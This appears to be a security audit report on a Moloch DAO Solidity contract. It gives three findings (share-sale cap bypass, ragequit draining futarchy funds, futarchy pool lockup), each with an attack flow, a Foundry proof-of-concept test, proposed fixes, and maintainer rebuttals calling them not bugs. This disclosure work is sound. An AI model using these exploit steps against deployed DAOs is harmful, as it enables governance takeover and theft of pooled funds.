# zFi Moloch DAO Audit
## Secured by [Plainshift AI](https://hackmd.io/@ileakalpha/SJn2083tWg)
**Date**: 2026-03-09
**Scope**: `src/Moloch.sol`
**Result**: 3 verified vulnerabilities (2 HIGH, 1 MEDIUM)

## Review Summary

> **Reviewed 2026-03-11. No production blockers identified.**
>
> - **Bug #1 (Sale cap):** Not a bug. Same finding as Zellic #13. Cap is a soft guardrail — minting mode is intended unlimited; non-minting mode is bounded by DAO balance. UI mitigates.
> - **Bug #2 (Ragequit + futarchy):** Not a bug. Design tradeoff. Ragequit gives pro-rata share of all DAO-held assets by design. Futarchy pools are incentive mechanisms subordinate to governance — not restrictive escrows. Members can always negate them via proposal, config changes, or ragequit.
> - **Bug #3 (Futarchy zero-voter lockup):** Not a bug. Funds remain in the DAO's contract balance and are accessible via governance proposals or ragequit. Futarchy pools are deprioritized when governance or members opt out. Minor accounting cleanup for v2.

---

## Bug #1: Capped Share Sale Becomes Unlimited After Exact Sell-Out

**Severity: HIGH**
**Location**: `Moloch.sol:716` and `Moloch.sol:724` (buyShares cap guard and decrement)
**Validity: Not a bug**

> **Review: Known quirk, not a security issue in practice.** Same finding as Zellic #13. Cap is a soft guardrail, not a hard limit. In `minting = true` mode, unlimited issuance is the intended behavior (upgrade/conversion use case). In `minting = false` mode, the DAO's preminted token balance provides a natural hard cap — `transfer` reverts when supply runs out. UI should treat a 0-cap on a previously-capped sale as "sold out" and prompt the DAO to deactivate. Consider auto-deactivation in v2.

### Description

The `buyShares` function uses a dual `cap != 0` check to (a) enforce that the purchase doesn't exceed the remaining capacity, and (b) decrement the remaining capacity after purchase:

```solidity
// Moloch.sol:715-728
uint256 cap = s.cap;
if (cap != 0 && shareAmount > cap) revert NotOk();    // L716: guard

uint256 price = s.pricePerShare;
uint256 cost = shareAmount * price;

if (maxPay != 0 && cost > maxPay) revert NotOk();

// EFFECTS (CEI)
if (cap != 0) {                                        // L724: decrement
    unchecked {
        s.cap = cap - shareAmount;                     // L726
    }
}
```

The value `0` has an ambiguous meaning in this encoding: when the DAO sets `cap = 0` initially, it means "unlimited sale." But when a capped sale sells out exactly (e.g., `cap = 100e18` and someone buys exactly `100e18`), `s.cap` becomes `0` via the unchecked subtraction at L726. From this point forward, both `cap != 0` checks read `false`, and the sale becomes unlimited — the cap guard at L716 no longer rejects oversized purchases, and the decrement at L724 no longer fires.

This is a classic sentinel-value collision: the sentinel for "unlimited" (0) collides with the natural terminal state of "fully sold out" (0).

### Attack Flow

1. DAO governance calls `setSale(payToken, price, 1000e18, true, true, false)` — capped sale of 1000 shares
2. Legitimate buyers purchase exactly 1000 shares across one or more transactions. `s.cap` reaches `0`.
3. The sale is now indistinguishable from an unlimited sale. The `active` flag remains `true`.
4. An attacker calls `buyShares(payToken, 1_000_000e18, 0)`. The guard at L716 passes (`0 != 0` is false). The decrement at L724 is skipped (`0 != 0` is false). 1,000,000 new shares are minted.
5. The attacker now holds a supermajority of the total supply, diluting all existing holders and controlling governance.

### Impact

- **Unlimited share minting**: Once the cap hits 0, any address can mint arbitrary quantities of shares or loot (depending on `s.isLoot`), paying the configured `pricePerShare` per unit.
- **Governance takeover**: The attacker can mint enough shares to control all future proposals, effectively seizing the DAO.
- **Treasury drain**: With a governance majority, the attacker can vote to transfer all treasury assets to themselves.
- **Applies to both shares and loot**: The `s.isLoot` flag determines whether shares or loot is minted, but both paths are affected.
- **Silent failure**: No event or revert signals the transition from "capped" to "unlimited." The DAO has no way to detect this state change without monitoring `s.cap` off-chain.

### POC

VM-confirmed (`REPRODUCED`). The between-wave VM tester (Scope 2, `dismissal-008`) demonstrated the full exploit chain: a capped sale exhausted to `cap = 0`, then an attacker minting beyond the original cap.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/Moloch.sol";

contract PlainshiftTest_sale_cap_bypass is Test {
    Moloch moloch;

    address alice = address(0xA11CE);
    address attacker = address(0xBAD);

    function setUp() public {
        address[] memory holders = new address[](1);
        holders[0] = alice;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000e18;
        Call[] memory initCalls = new Call[](0);

        Summoner summoner = new Summoner();
        moloch = summoner.summon(
            "TestDAO", "TD", "", 5000, true, address(0), bytes32(0),
            holders, amounts, initCalls
        );

        // DAO configures a capped sale: 500 shares at 1 wei each, minting mode
        vm.prank(address(moloch));
        moloch.setSale(address(0), 1, 500e18, true, true, false);

        vm.deal(alice, 10 ether);
        vm.deal(attacker, 10 ether);
    }

    function test_cap_bypass_after_sellout() public {
        // Step 1: Alice buys exactly 500e18 shares, exhausting the cap
        vm.prank(alice);
        moloch.buyShares{value: 500e18}(address(0), 500e18, 0);

        // Verify cap is now 0
        (,uint256 cap,,,) = moloch.sales(address(0));
        assertEq(cap, 0, "Cap should be 0 after exact sellout");

        // Step 2: Attacker buys 5000e18 shares — should revert but doesn't
        uint256 supplyBefore = moloch.shares().totalSupply();

        vm.prank(attacker);
        moloch.buyShares{value: 5000e18}(address(0), 5000e18, 0);

        uint256 supplyAfter = moloch.shares().totalSupply();
        uint256 minted = supplyAfter - supplyBefore;

        // BUG: 5000e18 shares minted beyond the original 500e18 cap
        assertEq(minted, 5000e18, "Attacker minted 10x the original cap");

        // Attacker now holds 5000/(1000+500+5000) = 76.9% of total supply
        uint256 attackerBal = moloch.shares().balanceOf(attacker);
        assertTrue(attackerBal > supplyAfter / 2, "Attacker controls governance majority");
    }
}
```

### Recommended Fix

Distinguish "unlimited" from "sold out" using a separate flag or a sentinel value that cannot arise from arithmetic:

```solidity
// Option A: Treat cap=0 after decrement as sold out (deactivate sale)
if (cap != 0) {
    unchecked {
        uint256 newCap = cap - shareAmount;
        s.cap = newCap;
        if (newCap == 0) s.active = false; // auto-deactivate on sellout
    }
}

// Option B: Use type(uint256).max as the "unlimited" sentinel
// In setSale: if (cap == 0) s.cap = type(uint256).max;
// In buyShares: if (cap != type(uint256).max && shareAmount > cap) revert NotOk();
```

---

## Bug #2: Ragequit Drains Futarchy Pool — Unsegregated ETH Balance

**Severity: HIGH**
**Location**: `Moloch.sol:790` (ragequit balance calculation)
**Validity: Not a bug**

> **Review: Design tradeoff, not a bug.** In Moloch-style governance, ragequit is the exit mechanism — members receive their pro-rata share of all DAO-held assets. This is intentional. Futarchy pools are incentive/prediction mechanisms subordinate to governance, not restrictive escrows. They can always be negated via proposal, config changes, or ragequit. If futarchy funds were excluded from ragequit, a hostile majority could fund enormous futarchy pools to shield treasury from exit, breaking the ragequit guarantee. Futarchy funders should understand their deposits become part of the DAO's general balance.

### Description

The `ragequit` function calculates each exiting member's proportional share of every requested token by reading the contract's **total balance** and dividing by the total supply of shares + loot:

```solidity
// Moloch.sol:780-795
for (uint256 i; i != tokens.length; ++i) {
    tk = tokens[i];
    // ...token validation...

    pool = tk == address(0) ? address(this).balance : balanceOfThis(tk);  // L790
    due = mulDiv(pool, amt, total);                                       // L791
    if (due == 0) continue;

    _payout(tk, msg.sender, due);                                         // L794
}
```

At L790, `address(this).balance` returns the **entire ETH balance** of the contract, which includes:
1. **Treasury ETH** — funds intentionally held for ragequit distribution
2. **Futarchy pool ETH** — funds deposited via `fundFutarchy` (L530-571) that are earmarked for prediction market payouts to winning voters

The futarchy pool maintains its own accounting (`FutarchyConfig.pool`), but this value is never subtracted from the ragequit calculation. The result: ragequitters receive a proportional share of **all** ETH, including funds that should be reserved for futarchy winners.

This creates a direct conflict between two protocol mechanisms: ragequit assumes it owns all ETH in the contract, while futarchy assumes its pool is protected. After a ragequit, the contract's actual ETH balance falls below the sum of all futarchy pool claims, making it impossible to fully pay out futarchy winners.

### Attack Flow

1. DAO has 10 ETH treasury. Alice and Bob each hold 500e18 shares (50/50).
2. A proposal is created and funded with 50 ETH via `fundFutarchy`. Contract now holds 60 ETH total.
3. Bob calls `ragequit([address(0)], 500e18, 0)`:
   - L790: `pool = address(this).balance = 60 ether`
   - L791: `due = mulDiv(60e18, 500e18, 1000e18) = 30 ether`
   - Bob receives **30 ETH** — but his fair share of treasury is only **5 ETH**
4. Contract balance is now 30 ETH. The futarchy pool still claims 50 ETH (`F.pool = 50e18`).
5. When futarchy resolves, winners attempt to cash out 50 ETH from a contract that only holds 30 ETH. Late claimants receive nothing.

### Impact

- **Direct fund theft**: A ragequitter extracts 6x their fair share (30 ETH vs 5 ETH in the example above). The excess comes directly from futarchy pool depositors.
- **Futarchy pool insolvency**: After the ragequit, the contract is underfunded. The accounting (`F.pool`) claims 50 ETH but only 30 ETH remains. Winners who cash out late receive nothing.
- **Scales with pool size**: The larger the futarchy pool relative to treasury, the greater the drain. A DAO with 1 ETH treasury and 1000 ETH in futarchy pools would see ragequitters extract nearly all futarchy funds.
- **No attacker required**: Any shareholder exercising their legitimate ragequit right triggers this. It's not an attack — it's a structural accounting error.
- **Affects ERC20 tokens too**: If the futarchy reward token is an external ERC20 (not `address(this)` or `address(1007)`), `balanceOfThis(tk)` at L790 reads the full ERC20 balance, including futarchy-earmarked tokens. The same drain applies.

### POC

Foundry-confirmed with a passing test demonstrating the full drain:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/Moloch.sol";

contract PlainshiftTest_ragequit_futarchy_drain is Test {
    Moloch moloch;

    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    address funder = address(0xF00D);

    function setUp() public {
        address[] memory holders = new address[](2);
        holders[0] = alice;
        holders[1] = bob;
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 500e18;
        amounts[1] = 500e18;
        Call[] memory initCalls = new Call[](0);

        Summoner summoner = new Summoner();
        moloch = summoner.summon(
            "TestDAO", "TD", "", 5000, true, address(0), bytes32(0),
            holders, amounts, initCalls
        );

        vm.deal(funder, 100 ether);
        vm.deal(address(moloch), 10 ether); // 10 ETH treasury
    }

    function test_ragequit_drains_futarchy_pool() public {
        vm.roll(block.number + 1); // advance block for snapshot

        // Step 1: Open a proposal and fund its futarchy pool with 50 ETH
        uint256 proposalId = 42;
        vm.prank(alice);
        moloch.castVote(proposalId, 1); // auto-opens proposal

        vm.prank(funder);
        moloch.fundFutarchy{value: 50 ether}(proposalId, address(0), 50 ether);

        // Verify state: 10 ETH treasury + 50 ETH futarchy = 60 ETH total
        (bool enabled,, uint256 pool,,,,) = moloch.futarchy(proposalId);
        assertTrue(enabled, "Futarchy should be enabled");
        assertEq(pool, 50 ether, "Pool should have 50 ETH");
        assertEq(address(moloch).balance, 60 ether, "Contract should hold 60 ETH");

        // Step 2: Bob ragequits 500 shares (50% of supply)
        uint256 bobBalBefore = bob.balance;
        address[] memory tokens = new address[](1);
        tokens[0] = address(0);

        vm.prank(bob);
        moloch.ragequit(tokens, 500e18, 0);

        uint256 bobReceived = bob.balance - bobBalBefore;

        // RESULT: Bob received 30 ETH (50% of 60 ETH total balance)
        // EXPECTED: Bob should receive 5 ETH (50% of 10 ETH treasury)
        assertEq(bobReceived, 30 ether, "Bob received 30 ETH (6x his fair share)");

        // Step 3: Verify futarchy pool is now insolvent
        uint256 contractBalAfter = address(moloch).balance;
        assertEq(contractBalAfter, 30 ether, "Only 30 ETH remains");
        assertTrue(contractBalAfter < pool, "Contract balance < futarchy pool = insolvent");
        // futarchy claims 50 ETH but contract only has 30 ETH
    }
}
```

**Test output** (passing):
```
Logs:
  Bob received (wei): 30000000000000000000
  Expected if correct (5 ETH): 5000000000000000000
  Expected if buggy (30 ETH): 30000000000000000000
  Contract balance after ragequit: 30000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped
```

### Recommended Fix

Subtract all active futarchy pool balances from the ragequit calculation. Two approaches:

```solidity
// Option A: Track aggregate earmarked funds in a state variable
uint256 public totalFutarchyReserved;

// In fundFutarchy: totalFutarchyReserved += amount;
// In _finalizeFutarchy: totalFutarchyReserved -= F.pool;
// In ragequit:
pool = tk == address(0)
    ? address(this).balance - totalFutarchyReserved
    : balanceOfThis(tk) - totalFutarchyReservedERC20[tk];

// Option B: Use a dedicated escrow address for futarchy funds
// fundFutarchy transfers to a separate escrow contract
// ragequit naturally excludes those funds
```

---

## Bug #3: Futarchy Pool Funds Permanently Locked When Winning Side Has Zero Voters

**Severity: MEDIUM**
**Location**: `Moloch.sol:618` (_finalizeFutarchy payout calculation)
**Validity: Not a bug**

> **Review: Minor design quirk, funds are not at risk.** The ETH remains in the DAO's contract balance and is fully accessible via governance proposals or ragequit. The funds are only "locked" from the futarchy cashout path specifically — not from the DAO itself. Futarchy pools are deprioritized when governance or members opt out. Zeroing `F.pool` when `winSupply == 0` is a clean accounting improvement for v2 but not a fund-loss issue.

### Description

When a futarchy-enabled proposal resolves, `_finalizeFutarchy` computes the payout ratio for winning-side voters:

```solidity
// Moloch.sol:612-629
function _finalizeFutarchy(uint256 id, FutarchyConfig storage F, uint8 winner) internal {
    unchecked {
        uint256 rid = _receiptId(id, winner);
        uint256 winSupply = totalSupply[rid];         // L615: total receipt tokens for winning side
        uint256 pool = F.pool;                        // L616: funded amount
        uint256 ppu;
        if (winSupply != 0 && pool != 0) {            // L618: BOTH must be non-zero
            F.finalWinningSupply = winSupply;
            ppu = mulDiv(pool, 1e18, winSupply);
            F.payoutPerUnit = ppu;                    // L621
        }

        F.resolved = true;                            // L624: marked resolved regardless
        F.winner = winner;

        emit FutarchyResolved(id, winner, pool, winSupply, ppu);
    }
}
```

The conditional at L618 requires **both** `winSupply != 0` (winning side has voters) **and** `pool != 0` (funds were deposited). If the winning side has zero voters (`winSupply == 0`), the entire `if` block is skipped: `payoutPerUnit` remains 0, `finalWinningSupply` remains 0, but `F.resolved` is set to `true` and `F.pool` retains the deposited amount.

Once `resolved = true`, `fundFutarchy` rejects further deposits (L540: `if (F.resolved) revert NotOk()`). And `cashOutFutarchy` requires burning receipt tokens, but no receipt tokens exist for the winning side. The pool funds are permanently locked with no recovery mechanism.

This can occur naturally in two scenarios:
1. **Proposal expires with no opposing votes**: If a proposal's TTL expires and the only votes were FOR (support=1), `resolveFutarchyNo` resolves with `winner=0` (AGAINST). But `totalSupply[receiptId(id, 0)]` is 0 because nobody voted against. The pool was funded by FOR-side supporters expecting their side to win.
2. **Proposal defeated with no FOR votes**: All votes are AGAINST, proposal is defeated. But `resolveFutarchyNo` sets `winner=0`. The AGAINST-side receipt supply exists, but `cashOutFutarchy` uses `winner` to determine which receipts to burn — and the winning (AGAINST) side's voters can claim. Actually in this case, the AGAINST voters DO have receipts and CAN claim. The real issue is scenario 1.

The critical scenario: futarchy pools are funded, a proposal expires or is resolved in favor of a side that has zero voters, and the entire pool becomes unrecoverable.

### Attack Flow

1. Alice creates a proposal and funds its futarchy pool with 100 ETH
2. Only Alice votes FOR (support=1). Nobody votes AGAINST (support=0).
3. The proposal's TTL expires. Anyone calls `resolveFutarchyNo(proposalId)`:
   - `_finalizeFutarchy(id, F, 0)` — winner is AGAINST (0)
   - `totalSupply[receiptId(id, 0)]` is 0 (nobody voted against)
   - L618: `winSupply != 0` is false → block skipped
   - `payoutPerUnit = 0`, `resolved = true`
4. Alice holds FOR receipts but the winner is AGAINST. She cannot call `cashOutFutarchy` because it burns `_receiptId(id, winner)` = AGAINST receipts, which she doesn't have.
5. No AGAINST voters exist to claim the pool either.
6. The 100 ETH is permanently locked in the contract.

### Impact

- **Permanent fund lockup**: Deposited futarchy funds become unrecoverable. There is no admin function, no sweep, and no fallback to return funds to depositors.
- **Natural occurrence**: This happens whenever a funded proposal expires with one-sided voting — a common governance scenario where proposals fail due to apathy rather than opposition.
- **Scales with futarchy usage**: DAOs that heavily use futarchy prediction markets risk accumulating permanently locked funds across multiple expired proposals.
- **No attacker required**: This is a protocol design flaw, not an exploit. It occurs through normal governance participation.

### POC

VM-confirmed (`REPRODUCED`) in both audit scopes. The between-wave VM tester demonstrated the full lockup scenario.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "../src/Moloch.sol";

contract PlainshiftTest_futarchy_zero_voter_lockup is Test {
    Moloch moloch;

    address alice = address(0xA11CE);
    address funder = address(0xF00D);

    function setUp() public {
        address[] memory holders = new address[](1);
        holders[0] = alice;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1000e18;
        Call[] memory initCalls = new Call[](0);

        Summoner summoner = new Summoner();
        moloch = summoner.summon(
            "TestDAO", "TD", "", 5000, true, address(0), bytes32(0),
            holders, amounts, initCalls
        );

        // Set proposal TTL so proposals can expire
        vm.prank(address(moloch));
        moloch.setProposalTTL(uint64(3600)); // 1 hour

        vm.deal(funder, 100 ether);
    }

    function test_zero_voter_fund_lockup() public {
        vm.roll(block.number + 1);

        // Step 1: Create proposal, Alice votes FOR, fund the futarchy pool
        uint256 proposalId = 42;

        vm.prank(alice);
        moloch.castVote(proposalId, 1); // Alice votes FOR

        vm.prank(funder);
        moloch.fundFutarchy{value: 100 ether}(proposalId, address(0), 100 ether);

        // Verify pool is funded
        (bool enabled,, uint256 pool,,,,) = moloch.futarchy(proposalId);
        assertTrue(enabled);
        assertEq(pool, 100 ether);

        // Step 2: Proposal TTL expires (nobody voted AGAINST)
        vm.warp(block.timestamp + 3601);

        // Step 3: Resolve futarchy as NO (proposal expired/defeated)
        moloch.resolveFutarchyNo(proposalId);

        // Step 4: Verify futarchy is resolved but funds are locked
        (,,,bool resolved,, uint256 finalSupply, uint256 payoutPerUnit) = moloch.futarchy(proposalId);
        assertTrue(resolved, "Futarchy resolved");
        assertEq(finalSupply, 0, "No winning-side voters");
        assertEq(payoutPerUnit, 0, "Zero payout per unit");

        // Step 5: Nobody can claim — AGAINST receipt supply is 0
        // Alice has FOR receipts but winner is AGAINST — wrong side
        // The 100 ETH is permanently locked in the contract
        assertEq(address(moloch).balance, 100 ether, "100 ETH permanently locked");

        // Step 6: Verify re-funding is also blocked (resolved = true)
        vm.prank(funder);
        vm.deal(funder, 1 ether);
        vm.expectRevert(abi.encodeWithSelector(NotOk.selector));
        moloch.fundFutarchy{value: 1 ether}(proposalId, address(0), 1 ether);
    }
}
```

### Recommended Fix

Add a fallback distribution path when the winning side has zero voters:

```solidity

function _finalizeFutarchy(uint256 id, FutarchyConfig storage F, uint8 winner) internal {
    unchecked {
        uint256 rid = _receiptId(id, winner);
        uint256 winSupply = totalSupply[rid];
        uint256 pool = F.pool;
        uint256 ppu;

        if (pool != 0) {
            if (winSupply != 0) {
                F.finalWinningSupply = winSupply;
                ppu = mulDiv(pool, 1e18, winSupply);
                F.payoutPerUnit = ppu;
            } else {
                // No winning-side voters: refund pool to DAO treasury
                // (funds remain in contract but are no longer earmarked)
                F.pool = 0;
                // Alternatively: distribute to losing side, or to a recovery address
            }
        }

        F.resolved = true;
        F.winner = winner;
        emit FutarchyResolved(id, winner, pool, winSupply, ppu);
    }
}
```